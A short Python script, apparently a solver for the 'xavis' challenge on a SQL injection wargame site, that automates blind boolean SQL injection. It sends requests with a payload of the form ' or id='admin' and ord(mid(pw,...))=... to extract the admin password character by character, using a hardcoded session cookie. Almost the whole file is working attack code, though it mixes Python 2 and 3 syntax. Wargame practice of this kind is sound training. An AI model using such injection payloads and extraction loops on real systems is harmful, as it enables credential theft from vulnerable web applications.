import requests
url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies = {'PHPSESSID': 'smho3jdtvfd07mggnsf578fhcd'}
length = 12
flag = [50864,50773,44403,0,0,0,0,0,0,0]
#우왕굳
x=0
for i in range(8,length+1):
    for j in range(0,10):
        url='https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
        query="?pw=' or id='admin' and ord(mid(pw,"+str(i)+",1))="+str(j)+"--%20"
        url+=query
        response = requests.get(url, headers=headers, cookies=cookies)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find("Hello admin") != -1):
            print "Hello admin"
            print j
            break
    
